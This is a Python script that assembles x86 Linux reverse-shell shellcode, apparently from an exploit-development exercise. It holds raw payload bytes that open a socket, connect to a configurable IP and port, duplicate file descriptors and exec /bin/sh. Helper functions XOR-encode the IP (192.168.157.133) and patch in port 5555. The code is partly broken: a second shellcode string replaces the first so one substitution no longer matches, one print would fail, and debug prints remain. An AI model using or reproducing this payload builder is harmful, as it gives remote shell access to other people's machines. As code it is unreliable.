import socket


code = ""
code += "\\x89\\xe5\\x31\\xc0\\x31\\xc9\\x31\\xd2"
code += "\\x50\\x50\\xb8\\xff\\xff\\xff\\xff\\xbb"
code += "\\x80\\xff\\xff\\xfe\\x31\\xc3\\x53\\x66"
code += "\\x68\\x11\\x5c\\x66\\x6a\\x02\\x31\\xc0"
code += "\\x31\\xdb\\x66\\xb8\\x67\\x01\\xb3\\x02"
code += "\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x66\\xb8"
code += "\\x6a\\x01\\x89\\xe1\\x89\\xea\\x29\\xe2"
code += "\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0"
code += "\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf6"
code += "\\x31\\xc0\\x31\\xd2\\x50\\x68\\x2f\\x2f"
code += "\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89"
code += "\\xe3\\xb0\\x0b\\xcd\\x80"

ip = socket.inet_aton("192.168.157.133")


def portInsert(code):
    port = hex(socket.htons(int("5555")))
    code = code.replace("\\x66\\x68\\x11\\x5c", "\\x66\\x68\\x{b1}\\x{b2}".format(
        b1=port[4:6],
        b2=port[2:4]
    ))
    return code

def ipInsert(ip, code, xor_byte):
    # Inject the IP address
    ip_bytes = []
    for i in range(0, 4):
        ip_bytes.append(hex(ip[i] ^ xor_byte))
    array_hex_ip = []
    for i in range(0, 4):
        if(len(ip_bytes[i][2:]) == 1):
            hex_ip_bytes = ip_bytes[i][1:2]+"0"+ip_bytes[i][2]
            array_hex_ip.append(hex_ip_bytes)
        else:
            array_hex_ip.append(ip_bytes[i][1:])
    code = code.replace("\\xbb\\x80\\xff\\xff\\xfe", "\\xbb\\{b1}\\{b2}\\{b3}\\{b4}".format(
        b1=array_hex_ip[0],
        b2=array_hex_ip[1],
        b3=array_hex_ip[2],
        b4=array_hex_ip[3]
    ))
    return code


def xorFinder(ip):
    xor_byte = 0
    for i in range(1, 256):
        matched_a_byte = False
        #print(" ------------- i  :"+str(i))
        for octet in ip:
            #print(str(octet)+" "+str(i)+" "+str(ip)+" "+str(xor_byte))
            if i == octet:
                #print("dans if : "+str(octet)+" "+str(i)+" "+str(ip)+" "+str(xor_byte))
                matched_a_byte = True
                break

        if not matched_a_byte:
            #print("dans if : "+str(octet)+" "+str(i)+" "+str(ip)+" "+str(xor_byte))
            xor_byte = i
            break

    # print(xor_byte)
    if xor_byte == 0:
        print("Failed to find a valid XOR byte")
        exit(1)
    return xor_byte


def xorInsert(ip, code):
    print("wouaw")
    print(code)
    xor_byte = xorFinder(ip)
    # Inject the XOR bytes
    if(len(hex(xor_byte)[2:]) == 1):
        hex_xor_byte = hex(xor_byte)[1:2]+"0"+hex(xor_byte)[2]
        print("hex_xor_byte : "+hex_xor_byte)
        code = code.replace("\\xb8\\xff\\xff\\xff\\xff",
                            "\\xb8\{x}\{x}\{x}\{x}".format(x=hex_xor_byte))
    else:
        code = code.replace("\\xb8\\xff\\xff\\xff\\xff",
                            "\\xb8\\x{x}\\x{x}\\x{x}\\x{x}".format(x=hex(xor_byte)[1:3]))
        print("xor_byte : "+xor_byte)
        print("hex(xor_byte)[1:3] : "+hex(xor_byte)[1:3])

    code = ipInsert(ip, code, xor_byte)
    return portInsert(code)

code="\\x89\\xe5\\x31\\xc0\\x31\\xc9\\x31\\xd2\\x50\\x50\\xbf\\x80\\xff\\xff\\xfe\\x83\\xf7\\xff\\x57\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x31\\xc0\\x31\\xdb\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x66\\xb8\\x6a\\x01\\x89\\xe1\\x89\\xea\\x29\\xe2\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf6\\x31\\xc0\\x31\\xd2\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80"
test=xorInsert(ip,code)
print("oui")
print(test)